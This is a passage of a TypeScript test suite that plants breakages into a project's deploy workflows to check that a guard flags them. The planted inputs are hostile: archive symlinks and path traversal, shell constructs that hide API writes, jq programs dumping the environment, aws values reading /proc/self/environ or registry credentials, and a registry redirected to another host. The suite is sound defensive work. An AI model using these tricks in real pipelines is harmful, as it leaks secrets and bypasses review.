    symlinkSync('/etc/hostname', join(named, 'index.json'))
    expect(checked(archive(named))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    // A hard link, an extra member, a fifo and a folder under a file's name.
    const hard = layout()
    execFileSync('ln', [join(hard, 'oci-layout'), join(hard, 'blobs', 'sha256', 'c'.repeat(64))])
    expect(checked(archive(hard, [`blobs/sha256/${'c'.repeat(64)}`]))).toEqual({
      status: 1,
      said: MEMBER,
      unpacked: [],
    })
    const extra = layout()
    writeFileSync(join(extra, 'manifest.json'), '[]')
    expect(checked(archive(extra, ['manifest.json']))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    const fifo = layout()
    execFileSync('mkfifo', [join(fifo, 'blobs', 'sha256', 'pipe')])
    expect(checked(archive(fifo, ['blobs/sha256/pipe']))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    const folder = layout()
    execFileSync('mkdir', [join(folder, 'blobs', 'sha256', 'd'.repeat(64))])
    expect(checked(archive(folder, [`blobs/sha256/${'d'.repeat(64)}`]))).toEqual({
      status: 1,
      said: MEMBER,
      unpacked: [],
    })
    // An absolute name, a name with .., and a name holding a line break.
    const absolute = layout()
    expect(
      checked(archive(absolute, ['index.json'], ['-P', `--transform=s,^,${join(scratch, 'absolute')}/,`])),
    ).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    expect(checked(archive(layout(), ['index.json'], ['-P', '--transform=s,^,../,']))).toEqual({
      status: 1,
      said: MEMBER,
      unpacked: [],
    })
    const broken = layout()
    writeFileSync(join(broken, 'x\nindex.json'), '')
    expect(checked(archive(broken, ['x\nindex.json']))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    // No archive at all, and a folder already there for the layout.
    const junk = join(scratch, 'junk.tar')
    writeFileSync(junk, 'not a tar\n')
    expect(checked(junk)).toEqual({ status: 1, said: "image-check: the image's archive can't be read", unpacked: [] })
    expect(checked(archive(layout()), `mkdir "$RUNNER_TEMP/image-layout"\n${IMAGE_UNPACK_RUN}\n`).status).not.toBe(0)
  })

  it('refuses an unpacked folder that holds a link even with no listing first', () => {
    const named = layout()
    rmSync(join(named, 'index.json'))
    symlinkSync('/etc/hostname', join(named, 'index.json'))
    const alone = `set -euo pipefail\n${IMAGE_CHECK}\nunpack_image "$RUNNER_TEMP/image/image.tar" "${IMAGE_LAYOUT}"\n`
    expect(checked(archive(named), alone)).toMatchObject({ status: 1, said: FOLDER })
    const extra = layout()
    writeFileSync(join(extra, 'manifest.json'), '[]')
    expect(checked(archive(extra, ['manifest.json']), alone)).toMatchObject({ status: 1, said: FOLDER })
  })
})

describe('DPW-11 (C11-D48): every checkout leaves no credential behind', () => {
  it('finds each planted breakage', () => {
    expect(checkoutFindings(plant('          persist-credentials: false\n', '', job('synth')))).toEqual([
      `${DEPLOY}: DPW-11 synth (Check out the release's commit): actions/checkout has persist-credentials: false`,
    ])
    expect(checkoutFindings(plant('          persist-credentials: false\n', '', '', CI))).toEqual([
      `${CI}: DPW-11 audit (step 1): actions/checkout has persist-credentials: false`,
    ])
    // GUARDS-03: the action quoted, or named in another letter case, which GitHub resolves alike.
    const step = '      - uses: actions/checkout@v5\n        with:\n          persist-credentials: false\n'
    for (const uses of ['"actions/checkout@v5"', "'actions/checkout@v5'", 'Actions/Checkout@v5']) {
      expect(
        checkoutFindings(plant(step, `      - uses: ${uses}\n        with:\n          fetch-depth: 1\n`, '', CI)),
        uses,
      ).toEqual([`${CI}: DPW-11 audit (step 1): actions/checkout has persist-credentials: false`])
    }
  })

  it('holds the repository', () => {
    expect(checkoutFindings(workflows)).toEqual([])
  })
})

describe('DPW-12 (C11-D63, C11-D64): words no workflow needs', () => {
  it('finds each word planted once, in deploy.yml (a comment included) and the general ones in ci.yml outside a comment', () => {
    for (const word of DEPLOY_WORDS) {
      expect(forbiddenWordFindings(plant('name: deploy\n', `# ${word}\nname: deploy\n`))).toEqual([
        `${DEPLOY}: DPW-12 names ${word}`,
      ])
    }
    expect(
      forbiddenWordFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          echo get-secret-value\n',
        ),
      ),
    ).toEqual([`${DEPLOY}: DPW-12 names get-secret-value`])
    // In deploy.yml a word inside a longer one counts too.
    expect(
      forbiddenWordFindings(plant('name: deploy\n', '# apps/server/scripts/check-owner-bootstrap.ts\nname: deploy\n')),
    ).toEqual([`${DEPLOY}: DPW-12 names owner-bootstrap`])
    expect(forbiddenWordFindings(plant('name: deploy\n', '# x-get-secret-value\nname: deploy\n'))).toEqual([
      `${DEPLOY}: DPW-12 names get-secret-value`,
    ])
    for (const word of GENERAL_WORDS) {
      expect(
        forbiddenWordFindings(
          plant(
            '      - run: npm audit signatures\n',
            `      - run: npm audit signatures\n      - run: echo ${word}\n`,
            '',
            CI,
          ),
        ),
      ).toEqual([`${CI}: DPW-12 names ${word}`])
      expect(forbiddenWordFindings(plant('jobs:\n', `# ${word}\njobs:\n`, '', CI))).toEqual([])
      // Round 4: a line starting with # inside a run is bash's, and inside a quoted string no comment at all,
      // so only a YAML comment is stripped.
      expect(
        forbiddenWordFindings(
          plant(
            '      - run: npm audit signatures\n',
            `      - run: npm audit signatures\n      - run: |\n          x="\n          # ${word}\n          "\n          eval "\${x//#/}"\n`,
            '',
            CI,
          ),
        ),
        word,
      ).toEqual([`${CI}: DPW-12 names ${word}`])
    }
  })

  it('holds the repository', () => {
    expect(forbiddenWordFindings(workflows)).toEqual([])
  })
})

describe('DPW-13 (C11-D44, C11-D50, C11-D51, C11-D61, C11-D79; T24 item 10): what is built, pushed, synthesised and recorded', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-13 ${where}: ${rule}`
  const PUSH =
    'pushes only as SKOPEO_COPY: --preserve-digests, --digestfile and the tag sha-$COMMIT-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT'
  const ONLY_PUSH = 'pushes only in the deploy-mode push step of nonprod and prod: no rollback, drill or restore pushes'
  const TAG = 'names an image by no tag but the push’s own'
  const SYNTH =
    'synthesises only as npm run synth -w @hearth/infra -- -c release="$COMMIT:$DIGEST", by mode -c drill=break:nonprod or -c restoreActive=true, and -o'
  const BODY = 'builds each record’s body whole by jq -n, with ref main, auto_merge false and no required contexts'
  const find = (from: string, to: string, after = '') => releaseFindings(plant(from, to, after))
  const push = '      - name: Push the image\n'

  it('finds each planted breakage', () => {
    expect(
      find(
        `npm run synth -w @hearth/infra -- -c release="$COMMIT:$DIGEST" "\${CONTEXT[@]}"`,
        'npm run synth:ci -w @hearth/infra --',
      ),
    ).toEqual([
      at('synth (Synthesise the release)', PINNED_13),
      at(
        'deploy.yml',
        "synthesises only with the pipeline's npm run synth, never synth:ci, synth:lz, HEARTH_FAKE_RELEASE or cdk synth",
      ),
      at('synth (Synthesise the release)', SYNTH),
    ])
    expect(find('          CONTEXT=()\n', '          CONTEXT=()\n          export HEARTH_FAKE_RELEASE=1\n')).toEqual([
      at('synth (Synthesise the release)', PINNED_13),
      at(
        'deploy.yml',
        "synthesises only with the pipeline's npm run synth, never synth:ci, synth:lz, HEARTH_FAKE_RELEASE or cdk synth",
      ),
    ])
    expect(find('          CONTEXT=()\n', '          CONTEXT=(-c release=x)\n')).toEqual([
      at('synth (Synthesise the release)', PINNED_13),
      at('synth (Synthesise the release)', SYNTH),
    ])
    expect(find(':sha-$COMMIT-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"', ':latest"', push)).toEqual([
      at('nonprod (Push the image)', PINNED_13),
      at('deploy.yml', 'names no image :latest'),
      at('nonprod (Push the image)', TAG),
      at('nonprod (Push the image)', PUSH),
    ])
    expect(find(':sha-$COMMIT-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"', ':sha-$COMMIT-$GITHUB_RUN_ID"', push)).toEqual([
      at('nonprod (Push the image)', PINNED_13),
      at('nonprod (Push the image)', TAG),
      at('nonprod (Push the image)', PUSH),
    ])
    expect(
      find(
        "needs.gate.outputs.build == 'true' }}",
        "(needs.gate.outputs.build == 'true' || needs.gate.outputs.mode == 'rollback') }}",
        job('build'),
      ),
    ).toEqual([at('build', 'runs only when the gate says so: a deploy, not a restore')])
    expect(
      releaseFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          gh api -X POST "repos/$REPO/deployments" --input - <<<"$BODY"\n',
        ),
      ),
    ).toEqual([
      at(
        'nonprod (Read back what runs)',
        'writes no record: release records are record-nonprod’s and record-prod’s, migration records migrate’s',
      ),
      at('nonprod (Read back what runs)', BODY),
    ])
    // A record written by a deploy job in any spelling gh takes: the method after the path, with =, or
    // left to gh, which posts whenever there is a body.
    const record = (line: string) =>
      releaseFindings(
        addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
      )
    const NO_RECORD = [
      at(
        'nonprod (Read back what runs)',
        'writes no record: release records are record-nonprod’s and record-prod’s, migration records migrate’s',
      ),
      at('nonprod (Read back what runs)', BODY),
    ]
    expect(record('ID=$(gh api "repos/$REPO/deployments" --method POST --input - <<<"$B")')).toEqual(NO_RECORD)
    expect(record('gh api --method=POST "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api -XPOST "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api \\\n            "repos/$REPO/deployments" --input - <<<"$B"')).toEqual(NO_RECORD)
    expect(record('gh api -X DELETE "repos/$REPO/deployments/$ID"')).toEqual([
      at('nonprod (Read back what runs)', 'sends a record’s body whole, with --input -'),
      ...NO_RECORD,
    ])
    // migrate's step writes its one migration record and that record's status, nothing beside them.
    const ended = '          one_off_end migrate "$MIGRATE_LINES" "$RUN"\n'
    expect(
      find(
        ended,
        `${ended}          ID=$(gh api -X POST "repos/$REPO/deployments" --input - --jq .id <<<"$BODY")\n`,
        job('nonprod'),
      ),
    ).toEqual([
      at('nonprod (Migrate)', PINNED_13),
      at('nonprod (Migrate)', 'writes in its migrate step the one migration record and its status alone'),
    ])
    // Any other write, GraphQL's included, is no record's.
    expect(record("gh api graphql -f query='mutation { x }'")).toEqual([
      at('nonprod (Read back what runs)', 'makes no GitHub API write but a record’s'),
      at('nonprod (Read back what runs)', 'sends a record’s body whole, with --input -'),
    ])
    expect(find('auto_merge: false, ', '', job('record-nonprod'))).toEqual([
      at('record-nonprod (Write the record)', PINNED_13),
      at('record-nonprod (Write the record)', BODY),
    ])
    expect(
      find(
        'id=$(gh api -X POST "repos/$REPO/deployments" --input - --jq .id <<<"$body")',
        'id=$(gh api -X POST "repos/$REPO/deployments" -f ref=main -f payload="$2" --jq .id)',
        job('record-nonprod'),
      ),
    ).toEqual([
      at('record-nonprod (Write the record)', PINNED_13),
      at('record-nonprod (Write the record)', HELD),
      at('record-nonprod (Write the record)', 'sends a record’s body whole, with --input -'),
    ])
    const end = '          one_off_end migrate "$MIGRATE_LINES" "$RUN"\n'
    const last = `          echo "migrate: recorded $COMMIT as the commit nonprod's database was migrated by" | mask | tee -a "$GITHUB_STEP_SUMMARY"\n`
    expect(
      releaseFindings(
        withText(DEPLOY, edited(edited(deployText, end, '', job('nonprod')), last, `${last}${end}`, job('nonprod'))),
      ),
    ).toEqual([
      at('nonprod (Migrate)', PINNED_13),
      at(
        'nonprod (Migrate)',
        'writes the migration record only after migrate’s own end, which fails on any exit but 0',
      ),
    ])
    expect(
      releaseFindings(
        addedBefore(
          'rollback-nonprod',
          'Roll back Tasks and Services',
          `          ${CDK_FOLDER}\n`,
          `          ${SKOPEO_COPY}\n`,
        ),
      ),
    ).toEqual([at('rollback-nonprod (Roll back Tasks and Services)', ONLY_PUSH)])
    expect(
      find(
        `if: \${{ needs.gate.outputs.mode == 'deploy' && needs.gate.outputs.target == 'prod' }}\n        env:\n          ACCOUNT_ID`,
        `if: \${{ (needs.gate.outputs.mode == 'deploy' && needs.gate.outputs.target == 'prod') || needs.gate.outputs.target == 'restore' }}\n        env:\n          ACCOUNT_ID`,
        job('prod'),
      ),
    ).toEqual([at('prod (Push the image)', PINNED_13), at('prod (Push the image)', ONLY_PUSH)])
  }, 30_000)

  // A record job holds deployments: write, so it runs no repository code: one step, no action, and only
  // bash's own, its functions, jq and gh api.
  it('finds an image archive pushed unchecked: the check dropped, moved past the credentials or skipped, or the push from the archive (SECURITY-01, round 5)', () => {
    const IMAGE =
      'checks and unpacks the image archive it downloaded (IMAGE_CHECK) after the download and before the credentials action, under the push’s if:'
    const step = 'Check and unpack the image'
    for (const id of ['nonprod', 'prod']) {
      expect(releaseFindings(removedStep(id, step)), id).toEqual([at(`${id} (${step})`, PINNED_13), at(id, IMAGE)])
      expect(releaseFindings(movedStep(id, step, 'What runs')), id).toEqual([at(id, IMAGE)])
      expect(releaseFindings(movedStep(id, step, 'Download the image')), id).toEqual([at(id, IMAGE)])
    }
    expect(
      releaseFindings(
        plant(
          `if: \${{ needs.gate.outputs.mode == 'deploy' }}\n        run: |\n          set -euo pipefail\n          # The runner reads`,
          `if: \${{ needs.gate.outputs.mode != 'rollback' }}\n        run: |\n          set -euo pipefail\n          # The runner reads`,
          job('nonprod'),
        ),
      ),
    ).toEqual([at(`nonprod (${step})`, PINNED_13), at('nonprod', IMAGE)])
    // The push handed the archive again, which skopeo would unpack itself.
    expect(
      find('"oci:$RUNNER_TEMP/image-layout:build"', '"oci-archive:$RUNNER_TEMP/image/image.tar:build"', push),
    ).toEqual([
      at('nonprod (Push the image)', PINNED_13),
      at('deploy.yml', 'hands skopeo no archive, which it would unpack itself: the push copies from an OCI layout'),
      at('nonprod (Push the image)', TAG),
      at('nonprod (Push the image)', PUSH),
    ])
    // The build's check of the archive buildx wrote, dropped.
    expect(find('          check_image_archive "$RUNNER_TEMP/image.tar"\n', '', job('build'))).toEqual([
      at('build (Build the image)', PINNED_13),
    ])
  })

  it('finds a check and unpacking skipped where the step runs before the credentials (DPW-06), and IMAGE_CHECK’s tools on any other line (DPW-10)', () => {
    const imageIf = `if: \${{ needs.gate.outputs.mode == 'deploy' }}\n        run: |\n          set -euo pipefail\n          # The runner reads`
    expect(deployStepFindings(plant(imageIf, imageIf.replace("== 'deploy'", "!= 'rollback'"), job('nonprod')))).toEqual(
      [
        `${DEPLOY}: DPW-06 nonprod: runs every step up to its credentials action, and AWS_CHECK after it, unconditionally, but its downloads and its image check, under the push’s if:`,
      ],
    )
    const tar = '          tar --extract --file "$1" --directory "$2" --no-same-owner --no-same-permissions\n'
    const found = credentialedCodeFindings(
      addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", tar),
      manifests,
      lockfile,
    )
    expect(found).toContain(
      `${DEPLOY}: DPW-10 nonprod (Read back what runs): runs nothing but bash’s own, its functions, gh api, git merge-base, jq, the text tools, aws, skopeo, the pinned CLI, CLI_FETCH’s fetch, IMAGE_CHECK’s listing and unpacking and the preamble’s stop token, and names no npm, npx, node, shell, source, eval, docker, python, make, curl or wget but that fetch, or script: no tool is handed a program to run`,
    )
  })

  it('finds a checkout or a program in a record job', () => {
    const RECORD = 'runs one step, with no action, of only bash’s own, its functions, jq and gh api: no repository code'
    const write = '      - name: Write the record\n'
    const checkout = [
      '      - name: Check out',
      '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1',
      '        with:',
      '          persist-credentials: false',
      '      - name: Run code',
      '        run: node scripts/x.ts',
      '',
    ].join('\n')
    expect(find(write, `${checkout}${write}`, job('record-nonprod'))).toEqual([
      at('record-nonprod (Run code)', UNPINNED),
      at('record-nonprod', RECORD),
    ])
    expect(
      releaseFindings(
        addedBefore('record-prod', 'Write the record', '          record() {\n', '          node scripts/x.ts\n'),
      ),
    ).toEqual([
      at('record-prod (Write the record)', PINNED_13),
      at('record-prod', RECORD),
      at('record-prod (Write the record)', HELD),
    ])
    expect(
      releaseFindings(
        addedBefore('record-prod', 'Write the record', '          record() {\n', '          ./scripts/x.sh\n'),
      ),
    ).toEqual([
      at('record-prod (Write the record)', PINNED_13),
      at('record-prod', RECORD),
      at('record-prod (Write the record)', HELD),
    ])
    // GUARDS-01: an escaped blank before # once hid what follows it from the reader; the table names no
    // unquoted backslash, and refuses it at its line (9, where the plant stands in the run).
    expect(
      releaseFindings(
        addedBefore('record-nonprod', 'Write the record', '          record() {\n', '          echo a\\ #;node x\n'),
      ),
    ).toEqual([
      at('record-nonprod (Write the record)', PINNED_13),
      at('record-nonprod', RECORD),
      at('record-nonprod (Write the record), line 9', AS_BASH),
    ])
  })

  // Round 2's GUARDS-01 and GUARDS-02: a record job's write hidden after a substitution's ), inside a ${…}
  // or in backticks is read or refused.
  it('finds a record write that a substitution’s ), a parameter expansion or backticks would hide', () => {
    const WHOLE = 'sends a record’s body whole, with --input -'
    const post = 'gh api -X POST "repos/$REPO/deployments" -f ref=main -f task=hearth-release -f environment=nonprod'
    const record = (line: string) =>
      releaseFindings(
        addedBefore('record-nonprod', 'Write the record', '          record() {\n', `          ${line}\n`),
      )
    const refused = at('record-nonprod (Write the record), line 9', AS_BASH)
    const pinned = at('record-nonprod (Write the record)', PINNED_13)
    expect(record(post)).toEqual([
      pinned,
      at('record-nonprod (Write the record)', HELD),
      at('record-nonprod (Write the record)', WHOLE),
    ])
    expect(record(`echo $(echo)#;${post}`)).toEqual([pinned, refused, at('record-nonprod (Write the record)', WHOLE)])
    expect(record(`echo \${x:-a #}; ${post}`)).toEqual([
      pinned,
      refused,
      at('record-nonprod (Write the record)', WHOLE),
    ])
    expect(record(`echo \`${post}\``)).toEqual([pinned, refused, at('record-nonprod (Write the record)', WHOLE)])
  })

  // Round 3's SECURITY-01, SECURITY-02 and GUARDS-05 in a record job, which holds deployments: write: a
  // quoted record write run by $[ … ], ${x@P}, a canonical line off its text, an offset or a compound
  // assignment's subscript, or by local given a flag or a name it builds, is refused; and so is a write
  // after an assignment that holds a substitution, which the reader now reads.
  it(`finds a record write that $[ ], \${x@P}, an offset, a subscript, a canonical line or local would run unseen`, () => {
    const RECORD = 'runs one step, with no action, of only bash’s own, its functions, jq and gh api: no repository code'
    const WHOLE = 'sends a record’s body whole, with --input -'
    const post =
      'gh api -X POST "repos/$REPO/deployments" -f ref=main -f task=hearth-release -f environment=nonprod --silent'
    const quoted = `'GITHUB_RUN_ATTEMPT[$(${post}; echo 0)]'`
    const pinned = at('record-nonprod (Write the record)', PINNED_13)
    const record = (...lines: string[]) =>
      releaseFindings(
        addedBefore(
          'record-nonprod',
          'Write the record',
          '          record() {\n',
          `          ${lines.join('\n          ')}\n`,
        ),
      )
    for (const lines of [
      [`x=${quoted}`, 'echo "$[x]" >/dev/null'],
      [`manifests=${quoted}`, 'manifests=$((manifests + 1))'],
      [`x='$(${post})'`, `echo "\${x@P}" >/dev/null`],
      [`y=${quoted}`, 'a=([y]=1)'],
      [`x=${quoted}`, 'local "$x=1"'],
    ]) {
      expect(record(...lines), lines.join('; ')).toEqual([
        pinned,
        at('record-nonprod (Write the record), line 10', AS_BASH),
      ])
    }
    expect(record(`y=${quoted}`, `: "\${@:y}"`)).toEqual([
      pinned,
      at('record-nonprod', RECORD),
      at('record-nonprod (Write the record), line 10', AS_BASH),
    ])
    const refused = at('record-nonprod (Write the record), line 9', AS_BASH)
    expect(record('local -n r=x')).toEqual([pinned, at('record-nonprod', RECORD), refused])
    expect(record('local -i n')).toEqual([pinned, at('record-nonprod', RECORD), refused])
    expect(record(`X=$(true) ${post}`)).toEqual([
      pinned,
      at('record-nonprod', RECORD),
      refused,
      at('record-nonprod (Write the record)', WHOLE),
    ])
  })

  // Round 4 in a record job: a form SHELL_TABLE doesn't name is refused at its line (9, where the plant
  // stands), and each command is held to the flags and arguments the workflow uses (GLUE_USES).
  it('refuses a form SHELL_TABLE doesn’t name and holds each command, in a record job', () => {
    const where = 'record-nonprod (Write the record)'
    const record = (line: string) =>
      releaseFindings(
        addedBefore('record-nonprod', 'Write the record', '          record() {\n', `          ${line}\n`),
      )
    for (const line of [
      `echo "\${x/a/b}"`,
      'echo "$(<x)"',
      'cat 0<&3',
      'echo "\\$x"',
      'while true; do break; done',
      'echo a |& cat',
      'echo a%b',
      'IFS=x',
      'eval "$x"',
      'set +e',
      'f() { :; }',
      'echo a > "$RUNNER_TEMP/x"',
    ]) {
      expect(record(line), line).toContain(at(`${where}, line 9`, AS_BASH))
    }
    for (const line of [
      'X=1 jq -n .',
      'jq -f x',
      "jq -n --rawfile a x '.'",
      "jq -n 'input_filename'",
      "jq -n '$__prog_args'",
      'gh api repos/x/y',
      'gh api -X DELETE "repos/$REPO/deployments/1"',
      'gh api -H x "repos/$REPO/deployments"',
      'tee x',
    ]) {
      expect(record(line), line).toContain(at(where, HELD))
    }
  })

  it('holds the repository', () => {
    expect(releaseFindings(workflows)).toEqual([])
  })
})

// Round 4's first attack on the allowlist: each way past it the attackers proved, planted as they planted
// it, is found at its root: a jq or gh program built from a quoted string and an expansion, the registry
// password asked for on a line of its own, a record, a function of a canonical text or an aws value
// given what the workflow never gives it, an input a pinned line reads set by a line of its own, an env:
// value or a whole env: mapping from elsewhere, and a step the gates, the smokes, the rollbacks or the
// records rest on ending early or writing an output of its own.
describe('Round 4, attack 1: the ways past the allowlist (DPW-07 to DPW-10, DPW-13)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const SETS_INPUT =
    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads but by a command its step's pinned run holds (TOKEN also on its own lines), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
  const ENV =
    'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
  const MAPPING =
    'writes env:, with: and outputs: as block mappings, never one expression GitHub would read as the whole mapping'
  const LOGIN = 'asks ECR for the registry password only as SKOPEO_LOGIN, piped straight into skopeo login'
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const mark = 'Services are about to change'
  const services = '          echo "services_started=true" >>"$GITHUB_OUTPUT"\n'
  const pushed = '          PUSHED=$(cat "$RUNNER_TEMP/pushed")\n'
  const migrated = '          MIGRATED=$(gh api "repos/$REPO/deployments'
  const smoke = '          if [ "$SMOKE" = success ] && [ "$MODE" != drill-smoke ]; then\n'
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')

  // EXPAND-A1-01 and COMMANDS-A1-02: a program word that joins a quoted string to an expansion hands jq (or
  // gh's --jq) a program built at run time, `.|env` or `$ENV|@base64`, which the hold never read.
  it('holds a jq or gh program to one whole single-quoted string (EXPAND-A1-01, COMMANDS-A1-02)', () => {
    const held = at('DPW-10', `nonprod (${mark})`, HELD)
    for (const program of [`'.'"$P"`, `''"$P"`, `'.|'"$P"`, `''"$P$GITHUB_WORKSPACE"'"}; $p'`]) {
      expect(
        credentialed(
          addedBefore('nonprod', mark, services, lines("A='|e'", "B='nv'", 'P="$A$B"', `jq -nc ${program}`)),
        ),
        program,
      ).toContain(held)
    }
    expect(
      releaseFindings(
        addedBefore(
          'record-nonprod',
          'Write the record',
          migrated,
          lines(
            "P='$E''NV|tostring|@base64'",
            `gh api "repos/$REPO/deployments?environment=$ENVIRONMENT&task=hearth-migrated&per_page=1" --jq '.|'"$P"`,
          ),
        ),
      ),
    ).toContain(at('DPW-13', 'record-nonprod (Write the record)', HELD))
    // The workflow's own programs, each one whole string, still pass.
    expect(credentialed(withText(DEPLOY, deployText))).toEqual([])
  }, 30_000)

  // COMMANDS-A1-01: the registry password, a credential good for twelve hours, asked for on a line of its
  // own goes to the log through the filter, which hides only twelve-digit runs.
  it('asks ECR for the registry password only as the login (COMMANDS-A1-01)', () => {
    for (const line of [
      'run aws ecr get-login-password --region ap-southeast-1',
      'X=$(get aws ecr get-login-password --region ap-southeast-1)',
      'get aws ecr get-login-password --region ap-southeast-1',
      'get aws ecr get-login-password --region ap-southeast-1 | tee -a "$GITHUB_STEP_SUMMARY"',
      'get aws ecr get-login-password --region ap-southeast-1 | mask',
    ]) {
      const planted = addedBefore('nonprod', 'Push the image', pushed, lines(line))
      expect(maskingFindings(planted), line).toContain(at('DPW-07', 'nonprod (Push the image)', LOGIN))
      expect(credentialed(planted), line).toContain(at('DPW-10', 'nonprod (Push the image)', HELD))
    }
  }, 30_000)

  // COMMANDS-A1-03: a record job writes only its own release records (and record-prod its restore records),
  // from the payload release_payload built, in its own environment.
  it('holds a record job to the records it writes, and their environment (COMMANDS-A1-03)', () => {
    const where = 'record-nonprod (Write the record)'
    for (const line of [
      `record hearth-migrated '{"schema": 1, "commit": "${'0'.repeat(40)}"}'`,
      'record hearth-"restore" "$PAYLOAD"',
      'record hearth-restore "$PAYLOAD"',
      `PAYLOAD=$(release_payload deploy ${'0'.repeat(40)} "$DIGEST" "$SERVICES")`,
    ]) {
      const found = releaseFindings(addedBefore('record-nonprod', 'Write the record', smoke, lines(line)))
      expect(found, line).toContain(at('DPW-13', where, HELD))
      expect(found, line).toContain(at('DPW-13', where, PINNED_13))
    }
    expect(
      releaseFindings(addedBefore('record-nonprod', 'Write the record', smoke, lines('ENVIRONMENT=prod'))),
    ).toContain(at('DPW-13', where, SETS_INPUT))
    // The record job's env: is held too: its ENVIRONMENT is its own.
    expect(
      credentialed(plant('          ENVIRONMENT: nonprod\n', '          ENVIRONMENT: prod\n', job('record-nonprod'))),
    ).toEqual([at('DPW-10', where, ENV)])
  }, 30_000)

  // COMMANDS-A1-04: a canonical text's function called again by a line of its own, or handed another
  // pattern by a variable set anew, prints the log lines it withholds.
  it('holds a call of a canonical function to the call the workflow makes (COMMANDS-A1-04)', () => {
    const record = '          # The migration record (C11-D58;'
    expect(credentialed(addedBefore('nonprod', 'Migrate', record, lines(`one_off_end migrate '.' "$RUN"`)))).toContain(
      at('DPW-10', 'nonprod (Migrate)', HELD),
    )
    expect(
      credentialed(
        addedBefore('nonprod', 'Migrate', '          one_off_end migrate "$MIGRATE_LINES"', lines("MIGRATE_LINES='.'")),
      ),
    ).toContain(at('DPW-10', 'nonprod (Migrate)', SETS_INPUT))
    expect(credentialed(addedBefore('nonprod', 'Migrate', record, lines("RUN='{}'")))).toContain(
      at('DPW-10', 'nonprod (Migrate)', SETS_INPUT),
    )
    expect(
      releaseFindings(addedBefore('nonprod', 'Migrate', record, lines(`one_off_end migrate '.' "$RUN"`))),
    ).toContain(at('DPW-13', 'nonprod (Migrate)', PINNED_13))
  }, 30_000)

  // COMMANDS-A1-05 and FLOW-A1-05: aws reads a file a value names by a scheme or a shorthand load anywhere in
  // it, quoted or not, and an option a quoted word spells; a value starting with an expansion holds what an
  // own line put there.
  it('holds each aws value as aws reads it (COMMANDS-A1-05, FLOW-A1-05)', () => {
    const readBack = "          SERVICE_LIST='[]'\n"
    const call = (value: string) =>
      `X=$(get aws ecs describe-services --cluster ${value} --services "hearth-$STAGE-api" --query 'services[0]' --output json)`
    for (const value of [
      `'file'://"$RUNNER_TEMP/x"`,
      `'file':///'pr'oc/self/environ`,
      '"$X"',
      `"x" '--debug'`,
      `"x" '--endpoint-url' x`,
      'fileb://x',
      '"https://x"',
    ]) {
      expect(
        credentialed(addedBefore('nonprod', 'Read back what runs', readBack, lines(call(value)))),
        value,
      ).toContain(at('DPW-10', 'nonprod (Read back what runs)', HELD))
    }
    const shorthand =
      'IDS=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$DIGEST,imageTag@=file://$XDG_RUNTIME_DIR/containers/auth.json" --query \'imageDetails[0].imageTags\' --output json)'
    expect(credentialed(addedBefore('nonprod', 'Push the image', pushed, lines(shorthand)))).toContain(
      at('DPW-10', 'nonprod (Push the image)', HELD),
    )
  }, 30_000)

  // COMMANDS-A1-06 and FLOW-A1-03: the login sends the password, and the copy the image, wherever REGISTRY
  // names; the tag's commit is COMMIT's, which the push's env: names.
  it('pins the push: its registry, its env and its run (COMMANDS-A1-06, FLOW-A1-03)', () => {
    const planted = addedBefore('nonprod', 'Push the image', pushed, lines('REGISTRY="registry.example.net"'))
    expect(credentialed(planted)).toContain(at('DPW-10', 'nonprod (Push the image)', SETS_INPUT))
    expect(releaseFindings(planted)).toContain(at('DPW-13', 'nonprod (Push the image)', PINNED_13))
    expect(credentialed(addedBefore('nonprod', 'Push the image', pushed, lines(`COMMIT=${'1'.repeat(40)}`)))).toContain(
      at('DPW-10', 'nonprod (Push the image)', SETS_INPUT),
    )
    const commit = `          COMMIT: \${{ steps.release.outputs.commit }}\n          DIGEST: \${{ steps.release.outputs.digest }}\n`
    for (const to of ['needs.gate.outputs.previous_nonprod_commit', 'steps.release.outputs.comit']) {
      expect(
        credentialed(
          plant(commit, commit.replace('steps.release.outputs.commit', to), '      - name: Push the image\n'),
        ),
        to,
      ).toEqual([at('DPW-10', 'nonprod (Push the image)', ENV)])
    }
    // The release step that names the commit is pinned whole too.
    expect(
      releaseFindings(
        addedBefore('nonprod', 'The release this job deploys', '          {\n', lines(`COMMIT=${'1'.repeat(40)}`)),
      ),
    ).toContain(at('DPW-13', 'nonprod (The release this job deploys)', PINNED_13))
  }, 30_000)

  // FLOW-A1-01 and FLOW-A1-02: a pinned run reads its inputs from its step's env:, which is pinned whole, so a
  // TARGET from prod-gate's outputs (which hold none) or another commit's SHA can't skip its checks.
  it('pins every env: value (FLOW-A1-01, FLOW-A1-02)', () => {
    const target = `          TARGET: \${{ needs.gate.outputs.target }}\n          RECORD_ID: \${{ needs.prod-gate`
    expect(
      credentialed(plant(target, target.replace('needs.gate.outputs.target', 'needs.prod-gate.outputs.target'))),
